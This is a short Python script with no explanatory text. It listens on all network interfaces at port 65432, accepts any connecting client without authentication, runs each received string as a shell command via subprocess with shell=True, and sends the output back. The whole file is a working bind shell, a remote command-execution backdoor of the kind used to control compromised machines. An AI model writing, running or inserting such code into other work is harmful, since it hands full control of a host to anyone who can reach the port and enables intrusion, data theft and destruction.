
import socket
import subprocess


def start_server(host='0.0.0.0', port=65432):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen()
        print(f"started at {host}:{port}")

        while True:
            conn, addr = server_socket.accept()
            with conn:
                print(f"client connected: {addr}")
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    command = data.decode('utf-8')
                    print(f"got cmd: {command}")

                    try:
                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                        result = output.stdout if output.stdout else output.stderr
                    except Exception as e:
                        result = str(e)

                    conn.sendall(result.encode('utf-8'))


if __name__ == "__main__":
    start_server()
